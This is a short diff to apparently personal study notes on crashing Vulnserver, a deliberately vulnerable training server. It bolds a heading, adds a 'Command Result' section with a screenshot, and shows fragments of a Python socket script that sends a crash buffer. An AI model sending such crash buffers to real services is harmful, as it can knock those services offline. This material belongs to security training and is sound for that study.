@@ -1,5 +1,5 @@
-- For Crashing VulnServer
-- 
+**- For Crashing VulnServer**
+
 ```
 #!/usr/bin/python
 
@@ -23,3 +23,7 @@ s.send(buffer)
 print (s.recv(1024))
 s.close()
 ```
+
+**- Command Result**
+
+![4b749a6b29b95f05cfd940b537976ac8.png](../_resources/4b749a6b29b95f05cfd940b537976ac8.png)
